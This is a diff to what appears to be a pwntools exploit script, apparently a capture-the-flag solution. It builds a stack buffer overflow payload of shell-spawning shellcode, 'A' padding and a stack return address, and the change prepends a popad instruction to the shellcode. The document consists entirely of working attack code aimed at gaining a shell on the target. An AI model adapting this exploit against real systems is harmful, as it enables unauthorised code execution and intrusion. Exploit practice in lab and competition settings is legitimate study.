@@ -23,7 +23,10 @@ io.sendlineafter('> ', '2')
 io.sendlineafter('password: ', password)
 
 log.info('Send payload')
-shellcode = asm(shellcraft.sh())
+shellcode = asm(
+    shellcraft.popad() +
+    shellcraft.sh()
+)
 padding = b'A' * (ret_offset - len(shellcode))
 payload = shellcode + padding + p64(stack_address)
 io.sendlineafter('commands: ', payload)
